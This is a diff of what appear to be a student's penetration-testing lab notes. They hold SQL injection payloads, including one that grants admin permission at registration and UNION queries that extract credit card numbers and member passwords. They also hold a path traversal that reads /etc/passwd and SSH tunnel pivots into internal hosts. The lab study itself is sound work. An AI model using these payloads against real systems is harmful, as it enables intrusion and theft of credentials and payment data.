@@ -227,10 +227,13 @@ http://127.0.0.1:1850/books_pick.php?book=../../../../../etc/passwd
 student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -D 9050
 student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -L 1850:10.100.28.55:80
 
-
-
-
-
+INSERT INTO members (first_name, last_name, username, password, email, permission)
+FN: Hacker
+LN: 
+Username: McGee', '1234', '1234', 1);#
+Password: 1
+Email: 1
+Then login
 
 
 
@@ -280,6 +283,18 @@ http://10.50.35.75/uniondemo.php?Selection=2 or 1=1 #
 http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,2 #
 http://10.50.35.75/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns #
 http://10.50.35.75/uniondemo.php?Selection=2 UNION select cost,color,year from session.car UNION select carid,name,type from session.car #
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,@@version #
+^ How you get the version of SQL 
+
+
+
+ssh -S /tmp/gray dummy -O forward -L 1870:10.100.28.48:80
+http://127.0.0.1:1870/cases/productsCategory.php?category=13
+http://127.0.0.1:1870/cases/productsCategory.php?category=1%20UNION%20select%20creditcard_number,2,3%20from%20sqlinjection.payments#
+http://127.0.0.1:1870/cases/productsCategory.php?category=1%20UNION%20select%20username,password,permission%20from%20sqlinjection.members#
+
+
+
 
 
 
